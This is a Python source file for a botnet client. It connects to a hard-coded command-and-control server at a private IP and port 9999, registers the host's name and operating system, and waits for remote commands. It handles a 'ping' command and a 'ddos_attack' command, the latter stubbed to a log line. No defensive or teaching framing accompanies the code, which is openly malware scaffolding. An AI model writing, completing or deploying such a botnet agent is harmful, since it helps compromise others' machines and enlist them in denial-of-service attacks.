"""
Botnet Client - Connects to C2 server
"""
import socket
import json
import threading
import time
import platform
from datetime import datetime
import logging

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

C2_HOST = "192.168.100.10"
C2_PORT = 9999

class BotnetClient:
    def __init__(self, c2_host, c2_port):
        self.c2_host = c2_host
        self.c2_port = c2_port
        self.socket = None
        self.connected = False
        self.client_id = f"bot_{platform.node()}_{int(time.time())}"
        self.running = True
    
    def connect(self):
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.connect((self.c2_host, self.c2_port))
            self.connected = True
            logger.info(f"[+] Connected to C2: {self.c2_host}:{self.c2_port}")
            
            # Send registration
            self.register()
            
            # Listen for commands
            self.listen()
        except Exception as e:
            logger.error(f"[-] Connection failed: {e}")
            time.sleep(5)
            self.connect()
    
    def register(self):
        msg = {
            'type': 'register',
            'client_id': self.client_id,
            'hostname': platform.node(),
            'platform': platform.system()
        }
        try:
            self.socket.send(json.dumps(msg).encode('utf-8'))
            logger.info(f"[*] Registered as: {self.client_id}")
        except:
            pass
    
    def listen(self):
        while self.running:
            try:
                data = self.socket.recv(4096).decode('utf-8')
                if data:
                    command = json.loads(data)
                    self.handle_command(command)
            except:
                self.connected = False
                break
    
    def handle_command(self, command):
        cmd = command.get('cmd')
        logger.info(f"[*] Received command: {cmd}")
        
        if cmd == 'ping':
            self.send_response({'type': 'pong'})
        elif cmd == 'ddos_attack':
            logger.info("[!] DDoS attack command received")
    
    def send_response(self, data):
        try:
            self.socket.send(json.dumps(data).encode('utf-8'))
        except:
            pass

if __name__ == '__main__':
    client = BotnetClient(C2_HOST, C2_PORT)
    try:
        client.connect()
    except KeyboardInterrupt:
        client.running = False
        logger.info("Shutting down...")